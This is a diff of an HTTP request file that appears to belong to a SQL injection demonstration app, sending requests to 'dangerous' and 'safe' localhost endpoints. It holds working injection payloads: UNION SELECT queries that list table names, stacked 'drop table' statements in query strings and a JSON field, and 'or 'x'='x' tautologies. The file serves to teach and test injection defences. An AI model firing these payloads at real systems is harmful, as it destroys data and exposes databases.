@@ -1,4 +1,9 @@
-@dangerous_api_url = http://localhost:8080/api/sqlinjection/danger/v1
+@dangerous_api_url = http://localhost:8080/api/sqlinjection/dangerous/v1
+
+@dangerous_api_jpa_url = http://localhost:8080/api/sqlinjection/dangerous/v2
+
+@safe_api_jpa_url = http://localhost:8080/api/sqlinjection/safe/v2
+
 @crud_api_url = http://localhost:8080/api/sqlinjection/crud/v1
 
 ###
@@ -35,7 +40,7 @@ GET {{dangerous_api_url}}/customers/1' UNION SELECT null, string_agg(table_name,
 
 ### To get all table names
 # drops the table
-GET {{dangerous_api_url}}/customers?gender=M'; drop table merchant;--
+GET {{dangerous_api_url}}/customers?gender=M'; drop table jdbc_merchant;--
 
 
 
@@ -118,7 +123,7 @@ GET  {{crud_api_url}}/customers/1' UNION SELECT null, string_agg(table_name, ','
 
 ### To get all table names
 # drops the table
-GET { {{crud_api_url}}/customers?gender=M'; drop table merchant;--
+GET {{crud_api_url}}/customers?gender=M'; drop table merchant;--
 
 
 #####
@@ -128,3 +133,22 @@ Content-Type: application/json
 {
   "newFullName": "Peter Parker'';drop table merchant --"
 }
+
+
+##### JPA API
+GET {{dangerous_api_jpa_url}}/customers/mdonald0@marriott.com' OR '1' != 'john
+Content-Type: application/json
+
+### 
+
+GET {{dangerous_api_jpa_url}}/customers/mdonald0@marriott.com
+Content-Type: application/json
+
+### 
+GET {{dangerous_api_jpa_url}}/customers?gender=M' or 'x' = 'x
+
+
+###  safe JPA request
+GET {{safe_api_jpa_url}}/customers?gender=M' or 'x' = 'x
+
+
